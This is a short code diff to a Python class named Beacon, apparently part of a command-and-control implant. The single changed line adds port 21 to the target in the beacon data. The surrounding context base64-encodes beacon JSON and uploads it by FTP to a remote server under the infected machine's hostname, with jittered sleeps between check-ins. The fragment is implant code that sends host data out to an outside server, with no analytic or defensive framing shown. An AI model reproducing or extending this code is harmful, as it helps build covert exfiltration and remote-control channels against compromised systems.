@@ -52,7 +52,7 @@ class Beacon:
             time.sleep(self.jitter)
 
     def stor(self):
-        b = json.dumps(self._build_beacon(self.target, self.links))
+        b = json.dumps(self._build_beacon('%s:21' % self.target, self.links))
         payload = base64.urlsafe_b64encode(b.encode())
         self.ftp.storlines('STOR %s.json' % socket.gethostname(), io.BytesIO(payload))
         self.links = []
